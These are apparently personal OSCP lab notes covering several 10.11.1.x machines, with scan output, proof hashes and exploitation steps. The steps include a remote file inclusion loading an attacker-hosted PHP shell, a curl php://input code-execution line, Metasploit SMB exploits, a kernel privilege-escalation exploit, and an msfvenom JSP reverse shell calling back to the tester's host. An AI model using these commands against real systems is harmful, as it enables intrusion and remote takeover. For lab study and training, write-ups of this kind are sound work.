/>445/tcp   open  microsoft-ds<br />3306/tcp  open  mysql<br />3389/tcp  open  ms-wbt-server<br />5985/tcp  open  wsman<br />47001/tcp open  winrm<br />49664/tcp open  unknown<br />49665/tcp open  unknown<br />49666/tcp open  unknown<br />49667/tcp open  unknown<br />49668/tcp open  unknown<br />49669/tcp open  unknown<br />49670/tcp open  unknown<br />49671/tcp open  unknown<br /><br />Nmap done: 1 IP address (1 host up) scanned in 102.28 seconds<br />You requested a scan type which requires root privileges.<br />QUITTING!<br />squid@CoolHandKali:/Yeet/Machines/OSCP/223$ <br /></div><div class='page'><h1 class='title level-5'>web</h1><br/>PORT    STATE SERVICE  REASON  VERSION<br />443/tcp open  ssl/http syn-ack Apache httpd 2.4.38 ((Win64) OpenSSL/1.0.2q PHP/5.6.40)<br />|_http-server-header: Apache/2.4.38 (Win64) OpenSSL/1.0.2q PHP/5.6.40<br /><br />80/tcp open  http    syn-ack Apache httpd 2.4.38 ((Win64) OpenSSL/1.0.2q PHP/5.6.40)<br />|_http-server-header: Apache/2.4.38 (Win64) OpenSSL/1.0.2q PHP/5.6.40<br /><br /></div><div class='page'><h1 class='title level-5'>33070.py</h1><br/>squid@CoolHandKali:/Yeet/Machines/OSCP/223$ python 33070.py http://10.11.1.223/index.php<br />  -= LOTFREE exploit for ApPHP MicroBlog 1.0.1 (Free Version) =-<br />original exploit by Jiko : http://www.exploit-db.com/exploits/33030/<br />[*] Testing for vulnerability...<br />[+] Website is vulnerable<br /><br />[*] Fecthing phpinfo<br />	PHP Version 5.6.40<br />	System   Windows NT JEFF 6.2 build 9200 (Windows Server 2012 Standard Edition) AMD64<br />	Loaded Configuration File   C:\xampp\php\php.ini<br />	Apache Version   Apache/2.4.38 (Win64) OpenSSL/1.0.2q PHP/5.6.40<br />	Server Root   C:/xampp/apache<br />	SystemRoot   C:\Windows<br />	DOCUMENT_ROOT   C:/xampp/htdocs<br />	PHP Version   5.6.40<br />	allow_url_fopen  On  On<br />	allow_url_include  Off  Off<br />	disable_functions   no value    no value<br />	open_basedir   no value    no value<br />	SystemDrive   C:<br />	SystemRoot   C:\Windows<br />	System V Message based IPC   Wez Furlong<br />	System V Semaphores   Tom May<br />	System V Shared Memory   Christian Cartus<br /><br />[*] Fetching include/base.inc.php<br />&lt;?php<br />    <br />    define(&#39;DATABASE_HOST&#39;, &#39;localhost&#39;);           // Database host<br />    define(&#39;DATABASE_NAME&#39;, &#39;blog&#39;);           // Name of the database to be used<br />    define(&#39;DATABASE_USERNAME&#39;, &#39;root&#39;);       // User name for access to database<br />    define(&#39;DATABASE_PASSWORD&#39;, &#39;dsfdfkj435dgf&#39;);   // Password for access to database<br />    <br />    define(&#39;DB_PREFIX&#39;, &#39;mb_&#39;);		        // Unique prefix of all tables in the database<br /><br />    define(&quot;PASSWORDS_ENCRYPTION_TYPE&quot;,  &quot;AES&quot;);  // AES|MD5<br />    define(&quot;PASSWORDS_ENCRYPTION&quot;,  true);              // true|false<br />    define(&quot;PASSWORDS_ENCRYPT_KEY&quot;, &quot;apphp_microblog&quot;);<br />    <br />?&gt;<br /><br />[*] Testing remote execution<br />[+] Remote exec is working with system() :)<br />Submit your commands, type exit to quit<br />&gt; <br /></div><div class='page'><h1 class='title level-4'>Pictures</h1><br/><a href=""><img src="images/1088-1.png" alt="images/1088-1.png" /></a></div><div class='page'><h1 class='title level-3'>10.11.1.227 JD rooted</h1><br/>ran nmap scan in accordance with labs looking for all smb vulns running windows machines. This one was vuln to ms08-067<br />set payload windows/meterpreter/bind_tcp<br />run<br />rooted<br /><br />257ea6949c88af6e0b160805b34fdab5</div><div class='page'><h1 class='title level-4'>enumeration</h1><br/>yeet</div><div class='page'><h1 class='title level-4'>Pictures</h1><br/><a href=""><img src="images/1127-1.png" alt="images/1127-1.png" /></a></div><div class='page'><h1 class='title level-3'>10.11.1.250 sandbox</h1><br/></div><div class='page'><h1 class='title level-4'>ajla</h1><br/>root<br />5e584c86f32741226abdf0dd3356e4dc</div><div class='page'><h1 class='title level-3'>OSCP.old</h1><br/></div><div class='page'><h1 class='title level-4'>proof.txt</h1><br/>10.11.1.8   phoenix<br />    f56a325ef00d4553a4046b7eacc5d667<br />    <br />10.11.1.13  bob<br />    a26f37da4583ff68f44d133d12ae3459 <br />    <br />10.11.1.146 susie<br />    78279a04f7020f4fb4599242fcfe70af<br />    <br />10.11.1.125 sherlock <br />    dae9aad6636a1c2c330b435e5d1f8120<br />    <br />10.11.1.31  ralph<br />     26b4cb0930a3e3be4da8e9d738607427 <br /><br />10.11.1.10  mike<br />    a416a831fddf36aa8c01ba0674ca7bf8 <br />    <br />10.11.1.24  payday<br />    c19cf7756cfef80636d95d9e73ef4a2e<br />    <br />10.11.1.71  alpha<br />    97f3446c2c2fc5079f22dc38f60c8a78<br />    <br />10.11.1.202 oracle<br />    b786e69b9cf7380e2e08321c6fc17aef<br />    <br />10.11.1.5   alice<br />    f56a325ef00d4553a4046b7eacc5d667<br />    <br />10.11.1.22  barry<br />    da690f91f46eb888719fe942efed2993<br />    <br />10.11.1.141 fc4<br />    8aafac90ff1c985236b1593e84709fb0</div><div class='page'><h1 class='title level-4'>5 Alice</h1><br/>Nmap smb vulns scan showed that the machine was vulnerable to ms08_067 netapi.<br />I figured that if it was vulnerable to that, it is probably vulnerable to the less fucky ms17-010.<br />used msf to send the exploit and it looked like it worked........ but It fails when it is trying to get the shell back to me<br />hmm<br />hmm<br />hmm<br />change payload from windows/meterpreter/reverse_tcp to windows/meterpreter/bind_tcp<br />rerun exploit...<br />and boom!!<br />rooted<br /><br /><br />post-root @c:\ there was a bank-account.zip. I downloaded it, but it was password protected... Future me should play with this. </div><div class='page'><h1 class='title level-5'>enumeration</h1><br/></div><div class='page'><h1 class='title level-6'>nmap</h1><br/>nmap 10.11.1.5<br />Starting Nmap 7.70 ( https://nmap.org ) at 2019-11-19 18:34 EST<br />Nmap scan report for 10.11.1.5<br />Host is up (0.044s latency).<br />Not shown: 995 closed ports<br />PORT     STATE SERVICE<br />135/tcp  open  msrpc<br />139/tcp  open  netbios-ssn<br />445/tcp  open  microsoft-ds<br />1025/tcp open  NFS-or-IIS<br />3389/tcp open  ms-wbt-server<br />MAC Address: 00:50:56:89:04:02 (VMware)<br /><br />Nmap done: 1 IP address (1 host up) scanned in 2.49 seconds<br />root@kali:~/Desktop/Machines/OSCP/5# <br /></div><div class='page'><h1 class='title level-6'>enum4linux</h1><br/>enum4linux -a 10.11.1.5 | tee e4lresults.txt<br />Starting enum4linux v0.8.9 ( <a href="http://labs.portcullis.co.uk/application/enum4linux/">http://labs.portcullis.co.uk/application/enum4linux/</a> ) on Tue Nov 19 18:36:26 2019<br /><br /> ========================== <br />|    Target Information    |<br /> ========================== <br />Target ........... 10.11.1.5<br />RID Range ........ 500-550,1000-1050<br />Username ......... &#39;&#39;<br />Password ......... &#39;&#39;<br />Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none<br /><br /><br /> ================================================= <br />|    Enumerating Workgroup/Domain on 10.11.1.5    |<br /> ================================================= <br />[+] Got domain/workgroup name: THINC<br /><br /> ========================================= <br />|    Nbtstat Information for 10.11.1.5    |<br /> ========================================= <br />Looking up status of 10.11.1.5<br />	ALICE           &lt;00&gt; -         B &lt;ACTIVE&gt;  Workstation Service<br />	THINC           &lt;00&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Domain/Workgroup Name<br />	ALICE           &lt;03&gt; -         B &lt;ACTIVE&gt;  Messenger Service<br />	ALICE           &lt;20&gt; -         B &lt;ACTIVE&gt;  File Server Service<br />	THINC           &lt;1e&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Browser Service Elections<br />	BACKDOOR        &lt;03&gt; -         B &lt;ACTIVE&gt;  Messenger Service<br /><br />	MAC Address = 00-50-56-89-04-02<br /><br /> ================================== <br />|    Session Check on 10.11.1.5    |<br /> ================================== <br />[E] Server doesn&#39;t allow session using username &#39;&#39;, password &#39;&#39;.  Aborting remainder of tests.<br /></div><div class='page'><h1 class='title level-6'>smb vuln scan</h1><br/>nmap -p 139,445 -vv --script=smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse 10.11.1.5<br />Starting Nmap 7.70 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2019-11-26 08:22 EST<br />NSE: Loaded 7 scripts for scanning.<br />NSE: Script Pre-scanning.<br />NSE: Starting runlevel 1 (of 1) scan.<br />Initiating NSE at 08:22<br />Completed NSE at 08:22, 0.00s elapsed<br />Initiating ARP Ping Scan at 08:22<br />Scanning 10.11.1.5 [1 port]<br />Completed ARP Ping Scan at 08:22, 0.08s elapsed (1 total hosts)<br />Initiating Parallel DNS resolution of 1 host. at 08:22<br />Completed Parallel DNS resolution of 1 host. at 08:22, 0.03s elapsed<br />Initiating SYN Stealth Scan at 08:22<br />Scanning 10.11.1.5 [2 ports]<br />Discovered open port 445/tcp on 10.11.1.5<br />Discovered open port 139/tcp on 10.11.1.5<br />Completed SYN Stealth Scan at 08:22, 0.08s elapsed (2 total ports)<br />NSE: Script scanning 10.11.1.5.<br />NSE: Starting runlevel 1 (of 1) scan.<br />Initiating NSE at 08:22<br />Completed NSE at 08:22, 16.10s elapsed<br />Nmap scan report for 10.11.1.5<br />Host is up, received arp-response (0.034s latency).<br />Scanned at 2019-11-26 08:22:34 EST for 16s<br /><br />PORT    STATE SERVICE      REASON<br />139/tcp open  netbios-ssn  syn-ack ttl 128<br />445/tcp open  microsoft-ds syn-ack ttl 128<br />MAC Address: 00:50:56:89:04:02 (VMware)<br /><br />Host script results:<br />| smb-vuln-ms08-067: <br />|   VULNERABLE:<br />|   Microsoft Windows system vulnerable to remote code execution (MS08-067)<br />|     State: VULNERABLE<br />|     IDs:  CVE:CVE-2008-4250<br />|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,<br />|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary<br />|           code via a crafted RPC request that triggers the overflow during path canonicalization.<br />|           <br />|     Disclosure date: 2008-10-23<br />|     References:<br />|       <a href="https://technet.microsoft.com/en-us/library/security/ms08-067.aspx">https://technet.microsoft.com/en-us/library/security/ms08-067.aspx</a><br />|_      <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250</a><br />|_smb-vuln-ms10-054: false<br />|_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND<br />| smb-vuln-ms17-010: <br />|   VULNERABLE:<br />|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)<br />|     State: VULNERABLE<br />|     IDs:  CVE:CVE-2017-0143<br />|     Risk factor: HIGH<br />|       A critical remote code execution vulnerability exists in Microsoft SMBv1<br />|        servers (ms17-010).<br />|           <br />|     Disclosure date: 2017-03-14<br />|     References:<br />|       <a href="https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/">https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/</a><br />|       <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143</a><br />|_      <a href="https://technet.microsoft.com/en-us/library/security/ms17-010.aspx">https://technet.microsoft.com/en-us/library/security/ms17-010.aspx</a><br /><br />NSE: Script Post-scanning.<br />NSE: Starting runlevel 1 (of 1) scan.<br />Initiating NSE at 08:22<br />Completed NSE at 08:22, 0.00s elapsed<br />Read data files from: /usr/bin/../share/nmap<br />Nmap done: 1 IP address (1 host up) scanned in 16.60 seconds<br />           Raw packets sent: 3 (116B) | Rcvd: 3 (116B)<br />root@kali:~/Desktop/Machines/OSCP/5# <br /></div><div class='page'><h1 class='title level-5'>proof</h1><br/>f56a325ef00d4553a4046b7eacc5d667</div><div class='page'><h1 class='title level-5'>screenshot</h1><br/><a href=""><img src="images/423-1.png" alt="images/423-1.png" /></a></div><div class='page'><h1 class='title level-5'>10.11.1.5</h1><br/>windows xp (no information to indicate a service pack)<br /><br />vulnerable to ms08_064_netapi, can be found at /usr/share/exploitdb/exploits/windows/remote/Squids_40279.py<br /><br />may also be vulnerable to ms17_010-- ask reggy</div><div class='page'><h1 class='title level-4'>7</h1><br/></div><div class='page'><h1 class='title level-5'>enumeration</h1><br/></div><div class='page'><h1 class='title level-6'>nmap</h1><br/>nmap 10.11.1.7<br />Starting Nmap 7.70 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2019-11-20 16:38 EST<br />Nmap scan report for 10.11.1.7<br />Host is up (0.041s latency).<br />Not shown: 999 filtered ports<br />PORT     STATE SERVICE<br />3389/tcp open  ms-wbt-server<br />MAC Address: 00:50:56:89:1A:CD (VMware)<br /><br />Nmap done: 1 IP address (1 host up) scanned in 7.15 seconds<br /><br /><br />nmap -sC -sV -p- 10.11.1.7<br />Starting Nmap 7.70 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2019-11-20 16:41 EST<br />Nmap scan report for 10.11.1.7<br />Host is up (0.048s latency).<br />Not shown: 65534 filtered ports<br />PORT     STATE SERVICE       VERSION<br />3389/tcp open  ms-wbt-server Microsoft Terminal Service<br />MAC Address: 00:50:56:89:1A:CD (VMware)<br />Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows<br /><br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 180.19 seconds<br />root@kali:~/Desktop/Machines/OSCP/7# <br /><br /></div><div class='page'><h1 class='title level-5'>10.11.1.7</h1><br/>finds<br />    username giraldo (maybe)<br />    pedro&lt;&lt;&lt;<br /><br />leads<br />    port 3389 open<br /><br />process<br />    ran hydra (with username giraldo and username list) No success<br />    ran wireshark and when following stream found potential username &quot;giraldo&quot;</div><div class='page'><h1 class='title level-4'>8 Phoenix</h1><br/>nmap showd that lots of ports were open, 80 being one of them, so I went to that first.<br />dirsearch showed /internal/<br />the page source showed that the machine was running “advanced comment system” “ACS” “advanced_comment_system”<br />searchsploit showed that there were possible remote file inclusions<br /><br />10.11.1.8/internal/advanced_comment_system/index.php?ACS_path=<a href="http://10.11.0.186/evil.txt%00">http://10.11.0.186/evil.txt%00</a><br />host evil.txt (which is a phpshell.php file) and listening on 80 got me a user shell<br /><br />also, <br /><code>curl -s --data &quot;&lt;?system(&#39;whoami&#39;);?&gt;&quot; &quot;http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00&quot;</code><br />got me code execution!!<br /><br />from here I went down the line of linux privesc steps and /etc/redhat<br />sh-3.00# cat /etc/redhat-release<br />CentOS release 4.8 (Final)<br /><br />searchsploit showed me that it was vulnerable to 9545.c<br />intially I compiled it like it said to              gcc -Wall -o linux-sendpage linux-sendpage.c<br />when I wget&#39;d it to the target and ran it I got the error                             error while loading shared libraries: requires glibc 2.5 or later dynamic linker<br />some googling told me to add          -Wl,--hash-style=both         to fix this error<br />recompiled with             gcc -Wall -Wl,--hash-style=both -o linux-sendpage linux-sendpage.c<br />ran it....<br />BOOM!!!<br />root<br />sh-3.00# cat proof.txt <br />f56a325ef00d4553a4046b7eacc5d667<br /></div><div class='page'><h1 class='title level-5'>10.11.1.8</h1><br/>nmap showd that lots of ports were open, 80 being one of them, so I went to that first.<br />dirsearch showed /internal/<br />the page source showed that the machine was running “advanced comment system” “ACS” “advanced_comment_system”<br />searchsploit showed that there were possible remote file inclusions<br /><br />10.11.1.8/internal/advanced_comment_system/index.php?ACS_path=<a href="http://10.11.0.186/evil.txt%00">http://10.11.0.186/evil.txt%00</a><br />host evil.txt (which is a phpshell.php file) and listening on 80 got me a user shell<br /><br />also, <br /><code>curl -s --data &quot;&lt;?system(&#39;whoami&#39;);?&gt;&quot; &quot;http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00&quot;</code><br />got me code execution!!<br /><br />from here I went down the line of linux privesc steps and /etc/redhat<br />sh-3.00# cat /etc/redhat-release<br />CentOS release 4.8 (Final)<br /><br />searchsploit showed me that it was vulnerable to 9545.c<br />intially I compiled it like it said to              gcc -Wall -o linux-sendpage linux-sendpage.c<br />when I wget&#39;d it to the target and ran it I got the error                             error while loading shared libraries: requires glibc 2.5 or later dynamic linker<br />some googling told me to add          -Wl,--hash-style=both         to fix this error<br />recompiled with             gcc -Wall -Wl,--hash-style=both -o linux-sendpage linux-sendpage.c<br />ran it....<br />BOOM!!!<br />root<br />sh-3.00# cat proof.txt <br />f56a325ef00d4553a4046b7eacc5d667<br /></div><div class='page'><h1 class='title level-6'>enumeration</h1><br/>justine<br /><br /><br />gcc -Wall -o linux-sendpage linux-sendpage.c<br />error while loading shared libraries: requires glibc 2.5 or later dynamic linker<br />gcc -Wall -Wl,--hash-style=both -o linux-sendpage linux-sendpage.c<br /><br /><br /><br />gcc -Wall -m64 -o linux-sendpage linux-sendpage.c</div><div class='page'><h1 class='title level-7'>nmap</h1><br/>nmap 10.11.1.8<br />Starting Nmap 7.70 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2019-11-14 11:52 EST<br />Nmap scan report for phoenix (10.11.1.8)<br />Host is up (0.036s latency).<br />Not shown: 990 filtered ports<br />PORT     STATE  SERVICE<br />21/tcp   open   ftp<br />22/tcp   open   ssh<br />25/tcp   closed smtp<br />80/tcp   open   http<br />111/tcp  open   rpcbind<br />139/tcp  open   netbios-ssn<br />443/tcp  open   https<br />445/tcp  open   microsoft-ds<br />631/tcp  open   ipp<br />3306/tcp open   mysql<br />MAC Address: 00:50:56:89:40:08 (VMware)<br /><br />Nmap done: 1 IP address (1 host up) scanned in 8.71 seconds<br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br />nmap -sC -sV -p- 10.11.1.8<br />Starting Nmap 7.70 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2019-11-14 11:53 EST<br />Nmap scan report for phoenix (10.11.1.8)<br />Host is up (0.094s latency).<br />Not shown: 65524 filtered ports<br />PORT     STATE  SERVICE     VERSION<br />21/tcp   open   ftp         vsftpd 2.0.1<br />| ftp-anon: Anonymous FTP login allowed (FTP code 230)<br />|_Can&#39;t get directory listing: ERROR<br />| ftp-syst: <br />|   STAT: <br />| FTP server status:<br />|      Connected to 10.11.0.186<br />|      Logged in as ftp<br />|      TYPE: ASCII<br />|      No session bandwidth limit<br />|      Session timeout in seconds is 300<br />|      Control connection is plain text<br />|      Data connections will be plain text<br />|      At session startup, client count was 1<br />|      vsFTPd 2.0.1 - secure, fast, stable<br />|_End of status<br />22/tcp   open   ssh         OpenSSH 3.9p1 (protocol 1.99)<br />| ssh-hostkey: <br />|   1024 89:94:af:2e:5d:c1:da:84:25:11:2c:12:45:c6:70:ac (RSA1)<br />|   1024 c1:c5:d1:83:0f:4d:d8:9e:8f:82:4c:be:53:4b:6e:14 (DSA)<br />|_  1024 bc:e1:e6:dd:ab:5e:fd:d1:21:2e:11:7c:d5:b2:03:52 (RSA)<br />|_sshv1: Server supports SSHv1<br />25/tcp   closed smtp<br />80/tcp   open   http        Apache httpd 2.0.52 ((CentOS))<br />| http-methods: <br />|_  Potentially risky methods: TRACE<br />| http-robots.txt: 2 disallowed entries <br />|_/internal/  /tmp/ <br />|_http-server-header: Apache/2.0.52 (CentOS)<br />|_http-title: Site doesn&#39;t have a title (text/html; charset=UTF-8).<br />111/tcp  open   rpcbind     2 (RPC #100000)<br />| rpcinfo: <br />|   program version   port/proto  service<br />|   100000  2            111/tcp  rpcbind<br />|   100000  2            111/udp  rpcbind<br />|   100024  1            844/udp  status<br />|_  100024  1            847/tcp  status<br />139/tcp  open   netbios-ssn Samba smbd 3.X - 4.X (workgroup: MYGROUP)<br />443/tcp  open   ssl/http    Apache httpd 2.0.52 ((CentOS))<br />| http-methods: <br />|_  Potentially risky methods: TRACE<br />| http-robots.txt: 2 disallowed entries <br />|_/internal/  /tmp/ <br />|_http-server-header: Apache/2.0.52 (CentOS)<br />|_http-title: Site doesn&#39;t have a title (text/html; charset=UTF-8).<br />| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--<br />| Not valid before: 2009-09-16T14:03:22<br />|_Not valid after:  2010-09-16T14:03:22<br />|_ssl-date: 2019-11-14T17:13:16+00:00; +4s from scanner time.<br />| sslv2: <br />|   SSLv2 supported<br />|   ciphers: <br />|     SSL2_DES_192_EDE3_CBC_WITH_MD5<br />|     SSL2_RC2_128_CBC_WITH_MD5<br />|     SSL2_DES_64_CBC_WITH_MD5<br />|     SSL2_RC4_64_WITH_MD5<br />|     SSL2_RC4_128_WITH_MD5<br />|     SSL2_RC4_128_EXPORT40_WITH_MD5<br />|_    SSL2_RC2_128_CBC_EXPORT40_WITH_MD5<br />445/tcp  open   netbios-ssn Samba smbd 3.0.33-0.17.el4 (workgroup: MYGROUP)<br />631/tcp  open   ipp         CUPS 1.1<br />| http-methods: <br />|_  Potentially risky methods: PUT<br />|_http-server-header: CUPS/1.1<br />|_http-title: 403 Forbidden<br />868/tcp  closed unknown<br />3306/tcp open   mysql?<br />|_mysql-info: ERROR: Script execution failed (use -d to debug)<br />MAC Address: 00:50:56:89:40:08 (VMware)<br />Service Info: OS: Unix<br /><br />Host script results:<br />|_clock-skew: mean: 1h40m04s, deviation: 2h53m14s, median: 3s<br />| smb-os-discovery: <br />|   OS: Unix (Samba 3.0.33-0.17.el4)<br />|   Computer name: phoenix<br />|   NetBIOS computer name: <br />|   Domain name: <br />|   FQDN: phoenix<br />|_  System time: 2019-11-14T12:13:17-05:00<br />| smb-security-mode: <br />|   account_used: guest<br />|   authentication_level: user<br />|   challenge_response: supported<br />|_  message_signing: disabled (dangerous, but default)<br />|_smb2-time: Protocol negotiation failed (SMB2)<br /><br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 1171.50 seconds<br />root@kali:~/Desktop/Machines/OSCP/8# <br /></div><div class='page'><h1 class='title level-7'>dirsearch</h1><br/>python3 /root/Desktop/Tools/dirsearch/dirsearch.py -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -e php -f -t 20 -u <a href="http://10.11.1.8:80">http://10.11.1.8:80</a> --simple-report dirsearchsimple_10.11.1.8:80<br /><br /> _|. _ _  _  _  _ _|_    v0.3.8<br />(_||| _) (/_(_|| (_| )<br /><br />Extensions: php | HTTP method: get | Threads: 20 | Wordlist size: 441041<br /><br />Error Log: /root/Desktop/Tools/dirsearch/logs/errors-19-11-14_11-55-51.log<br /><br />Target: <a href="http://10.11.1.8:80">http://10.11.1.8:80</a><br /><br />[11:55:53] Starting: <br />[11:55:53] 403 -  285B  - /cgi-bin/<br />[11:55:54] 200 -   19KB - /icons/<br />[11:56:03] 200 -    7KB - /manual/<br />[11:56:12] 403 -  283B  - /usage/<br />[11:56:33] 403 -  283B  - /error/<br />[11:56:38] 200 -    7KB - /internal/<br />CTRL+C detected: Pausing threads, please wait...<br />[e]xit / [c]ontinue: e<br /><br />Canceled by the user<br /></div><div class='page'><h1 class='title level-7'>nikto</h1><br/>nikto -host <a href="http://10.11.1.8:80">http://10.11.1.8:80</a> | tee nikto_10.11.1.8:80<br />- Nikto v2.1.6<br />---------------------------------------------------------------------------<br />+ Target IP:          10.11.1.8<br />+ Target Hostname:    10.11.1.8<br />+ Target Port:        80<br />+ Start Time:         2019-11-14 11:55:50 (GMT-5)<br />---------------------------------------------------------------------------<br />+ Server: Apache/2.0.52 (CentOS)<br />+ Server leaks inodes via ETags, header found with file /, inode: 20176, size: 218, mtime: Sun Jun  3 12:23:28 1979<br />+ The anti-clickjacking X-Frame-Options header is not present.<br />+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS<br />+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type<br />+ Retrieved x-powered-by header: PHP/4.3.9<br />+ Entry &#39;/internal/&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)<br />+ &quot;robots.txt&quot; contains 2 entries which should be manually viewed.<br />+ Apache/2.0.52 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.<br />+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE <br />+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST<br />+ OSVDB-3092: /internal/: This might be interesting...<br />+ Uncommon header &#39;tcn&#39; found, with contents: choice<br />+ OSVDB-3092: /manual/: Web server manual found.<br />+ OSVDB-3268: /icons/: Directory indexing found.<br />+ OSVDB-3268: /manual/images/: Directory indexing found.<br />+ OSVDB-3233: /icons/README: Apache default file found.<br />+ 8351 requests: 1 error(s) and 16 item(s) reported on remote host<br />+ End Time:           2019-11-14 12:17:13 (GMT-5) (1283 seconds)<br />---------------------------------------------------------------------------<br />+ 1 host(s) tested<br /></div><div class='page'><h1 class='title level-5'>screenshot</h1><br/><a href=""><img src="images/404-1.png" alt="images/404-1.png" /></a></div><div class='page'><h1 class='title level-5'>proof</h1><br/>f56a325ef00d4553a4046b7eacc5d667</div><div class='page'><h1 class='title level-4'>10 Mike</h1><br/>nmap showed that 80 was the only port running<br />nmap web enum showed gave up a hash due to the version of cold fusion<br />username admin password pass123<br />once in I <br />Debugging &amp; logging &gt; Scheduled Tasks &gt; taskname: yee &gt; one-time &gt; url: <a href="http://10.11.0.186:8000/443.jsp">http://10.11.0.186:8000/443.jsp</a> &gt; username: admin &gt; password &gt; pass123 <br />&gt; publish: CHECK &gt; file: C:\Inetpub\wwwroot\CFIDE\443.jsp &gt; submit<br /><br />NOTE: file location was leaked at       server settings &gt; mappings<br /><br />msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.11.0.186 LPORT=443 -f raw &gt; 443.jsp<br />^^Hosted file<br /><br />start msfconsole listener<br />run scheduled task<br />navigate to             <a href="http://10.11.1.10/CFIDE/443.jsp">http://10.11.1.10/CFIDE/443.jsp</a><br /><br />got shell!!<br />whoami<br />    nt authority/system<br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br />nmap -vv --reason -Pn -sV -p 80 --script=&quot;banner,(http* or ssl*) and not (brute or broadcast or dos or external or http-slowloris* or fuzzer)&quot; 10.11.1.10</div><div class='page'><h1 class='title level-5'>enumeration</h1><br/><code>nmap -v -p 80 --script=http-vuln-cve2010-2861 $ip</code><br /><br />admin   pass123</div><div class='page'><h1 class='title level-6'>nmap</h1><br/>nmap 10.11.1.10<br />Starting Nmap 7.70 ( https://nmap.org ) at 2019-11-20 18:09 EST<br />Nmap scan report for 10.11.1.10<br />Host is up (0.040s latency).<br />Not shown: 999 filtered ports<br />PORT   STATE SERVICE<br />80/tcp open  http<br />MAC Address: 00:50:56:93:4E:DC (VMware)<br /><br />Nmap done: 1 IP address (1 host up) scanned in 6.73 seconds<br /></div><div class='page'><h1 class='title level-6'>dirsearch</h1><br/>python3 /root/Desktop/Tools/dirsearch/dirsearch.py -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -e php -f -t 20 -u <a href="http://10.11.1.10:80">http://10.11.1.10:80</a> --simple-report dirsearchsimple_10.11.1.10:80<br /><br /> _|. _ _  _  _  _ _|_    v0.3.8<br />(_||| _) (/_(_|| (_| )<br /><br />Extensions: php | HTTP method: get | Threads: 20 | Wordlist size: 441041<br /><br />Error Log: /root/Desktop/Tools/dirsearch/logs/errors-19-11-20_18-11-00.log<br /><br />Target: <a href="http://10.11.1.10:80">http://10.11.1.10:80</a><br /><br />[18:11:00] Starting: <br />[18:16:39] 403 -  218B  - /cfdocs/<br /><br />Task Completed<br /></div><div class='page'><h1 class='title level-6'>nikto</h1><br/>nikto -host <a href="http://10.11.1.10:80">http://10.11.1.10:80</a> | tee nikto_10.11.1.10:80<br />- Nikto v2.1.6<br />---------------------------------------------------------------------------<br />+ Target IP:          10.11.1.10<br />+ Target Hostname:    10.11.1.10<br />+ Target Port:        80<br />+ Start Time:         2019-11-20 18:10:59 (GMT-5)<br />---------------------------------------------------------------------------<br />+ Server: Microsoft-IIS/6.0<br />+ The anti-clickjacking X-Frame-Options header is not present.<br />+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS<br />+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type<br />+ No CGI Directories found (use &#39;-C all&#39; to force check all possible dirs)<br />+ Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST <br />+ Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST <br />+ Uncommon header &#39;server-error&#39; found, with contents: true<br />+ OSVDB-3233: /CFIDE/probe.cfm: Cold Fusion file probe.cfm reveals system information, such as the path to the web server. In the &#39;Debugging Settings&#39; page in the Administrator console, suppress the installation path displayed in error messages by selecting &#39;Enable Robust Exception Info<br />+ Cookie CFID created without the httponly flag<br />+ Cookie CFTOKEN created without the httponly flag<br />+ Cookie CFAUTHORIZATION_cfadmin created without the httponly flag<br />+ OSVDB-3399: /CFIDE/administrator/index.cfm: ColdFusion Administrator for ColdFusion 4.5.1 and earlier may have an overflow DoS by modifying the login page and submit 40k character passwords. This page should not be accessible to all users. <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-0538.">http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-0538.</a> ALLAIRE:ASB00-14. <a 